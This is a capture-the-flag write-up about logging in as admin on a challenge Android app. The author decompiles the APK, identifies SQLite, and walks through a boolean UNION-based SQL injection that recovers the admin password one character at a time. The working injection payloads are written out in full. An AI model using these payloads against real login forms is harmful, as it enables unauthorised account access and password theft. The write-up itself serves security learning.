# True or false?
## Description
True or false, we can log in as admin easily.

The description hints that the admin login has a boolean SQL injection, with that in mind, I tried some simple SQL injection,
found this little hint by click "Forget Password"
![ ](./../resources/hint.jpg?raw=true)

Without knowing what type of SQL it could be, I went to decompile the apk to get an answer.
```
sudo apt install jadx dex2jar
```
![ ](./../resources/dex.jpg?raw=true)</br>
Start jadx-gui and open the jar file</br>
![ ](./../resources/jadx.jpg?raw=true)</br>
The app uses SQLite as its database</br>
![ ](./../resources/sqlite.jpg?raw=true)</br>
<br>
<br>
After many google searches later, I came across this [ExploitDB PDF](https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf)</br>
With that our goal is to get a "true" from the admin login.</br>
![ ](./../resources/sqltest.jpg?raw=true)</br>
Now that we know UNION sql injection works, we just need to figure out how to get the password.</br>
<br>
From the "reset password" hint, we know that the "Users" table exist and "admin" too.</br>
I got this to work:</br>
![ ](./../resources/boolean.jpg?raw=true)

Explanation of how the SQLi works:
We know that from the "Users" table, there is most likely a "username" column with "admin" in it
|      Users    |               |
| ------------- | ------------- |
| username      | admin         |

substr(username,1,1) = substr("admin",1,1)</br>
substr(string,position,length)</br>
username,1,1 = a</br>
username,1,2 = ad</br>
username,2,1 = d</br>
username,2,2 = dm</br>
<br>
<br>
<br>
So we can test whether it's more or less or equal</br>
<br>
hex('a') = 61</br>
hex('z') = 7A</br>
<br>
hex('a') = hex('a') (True)</br>
hex('a') > hex('a') (False)</br>
hex('a') < hex('a') (False)</br>
<br>
hex('a') = hex('z') (False)</br>
hex('a') > hex('z') (False)</br>
hex('a') < hex('z') (True)</br>

This time we use password column (;-; 32 words to guess, tried burp but nothing)<br>
' union select password from Users where hex(substr(password,1,1))=hex('M')-- -<br>
' union select password from Users where hex(substr(password,2,1))=hex('y')-- -<br>
' union select password from Users where hex(substr(password,3,1))=hex('_')-- -<br>
...</br>
![ ](./../resources/login.jpg?raw=true)
![ ](./../resources/admin.jpg?raw=true)
